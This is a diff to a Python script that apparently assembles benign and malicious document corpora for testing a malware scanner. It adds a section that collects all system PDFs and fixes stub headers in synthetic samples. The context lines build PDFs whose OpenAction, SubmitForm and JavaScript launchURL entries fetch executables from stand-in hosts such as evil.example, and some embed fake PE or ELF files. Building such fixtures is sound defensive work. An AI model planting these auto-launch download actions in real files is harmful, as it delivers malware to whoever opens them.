@@ -181,6 +181,21 @@ def collect_benign(benign: Out, ambiguous: Out):
                 n += 1
 
 
+def collect_system_pdfs(out: Out):
+    """Every PDF shipped on the host (no filtering): a fixed, reproducible benign section."""
+    found = subprocess.run(["find", "/usr/share", "/usr/lib", "/opt", "-type", "f", "-iname", "*.pdf", "-size", "-30M"],
+                           capture_output=True, text=True).stdout.splitlines()
+    for p in sorted(found):
+        if any(k in p.lower() for k in ("yara", "malware", "eicar", "/ai_firewall/")):
+            continue
+        try:
+            data = open(p, "rb").read()
+        except OSError:
+            continue
+        if data.startswith(b"%PDF"):
+            out.add(data, "system", p, "pdf", "system-pdf")
+
+
 def collect_real_malicious(mal: Out):
     ole = os.path.join(ROOT, "a6_oletools", "repo", "tests", "test-data")
     for p in walk(ole):
@@ -236,9 +251,9 @@ def collect_synthetic(syn: Out):
     syn.add(mk_pdf("/Names << /JavaScript << /Names [(a) 4 0 R] >> >>", "4 0 obj\n<< /S /JavaScript /JS (app.launchURL('http://x/y.exe'););>>\nendobj\n"), S, "e.pdf", "pdf", "pdf-names-js")
     syn.add(mk_pdf("/OpenAction << /S /URI /URI (http://evil.example/payload.exe) >>"), S, "f.pdf", "pdf", "pdf-openaction-uri-exe")
     syn.add(mk_pdf("/OpenAction << /S /SubmitForm /F (http://evil.example/drop.exe) >>"), S, "g.pdf", "pdf", "pdf-openaction-submitform-exe")
-    pe = b"MZ\x90\x00" + b"\x00" * 60 + b"PE\x00\x00" + b"\x41" * 200
+    pe = b"MZ\x90\x00" + b"\x00" * 56 + b"\x40\x00\x00\x00" + b"PE\x00\x00" + b"\x41" * 200
     syn.add(mk_pdf("/Names << /EmbeddedFiles << /Names [(a.exe) 4 0 R] >> >>", "4 0 obj\n<< /Type /EmbeddedFile /Length %d >>\nstream\n" % len(pe) + pe.decode("latin-1") + "\nendstream\nendobj\n"), S, "h.pdf", "pdf", "pdf-embedded-exe")
-    syn.add(mk_pdf("", "4 0 obj\n<< /Type /Filespec /F (run.exe) /EF << /F 5 0 R >> >>\nendobj\n5 0 obj\n<< /Type /EmbeddedFile /Length 10 >>\nstream\n\x7fELF\x02\x01\x01\x00\x00\x00\nendstream\nendobj\n"), S, "i.pdf", "pdf", "pdf-embedded-elf")
+    syn.add(mk_pdf("", "4 0 obj\n<< /Type /Filespec /F (run.exe) /EF << /F 5 0 R >> >>\nendobj\n5 0 obj\n<< /Type /EmbeddedFile /Length 10 >>\nstream\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\nendstream\nendobj\n"), S, "i.pdf", "pdf", "pdf-embedded-elf")
     for name, mod in (("word/vbaProject.bin", "docx"), ("xl/vbaProject.bin", "xlsx"), ("ppt/vbaProject.bin", "pptx")):
         b = io.BytesIO()
         with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
@@ -274,7 +289,10 @@ def collect_synthetic(syn: Out):
 
 def main():
     benign, mal, syn, amb = Out("doc_benign"), Out("doc_malicious_real"), Out("doc_malicious_synth"), Out("doc_ambiguous")
+    sysb = Out("doc_benign_system")
     collect_benign(benign, amb)
+    collect_system_pdfs(sysb)
+    sysb.finish("BENIGN: all PDFs shipped under /usr/share,/usr/lib,/opt (unfiltered)")
     collect_real_malicious(mal)
     collect_synthetic(syn)
     benign.finish("BENIGN real documents")
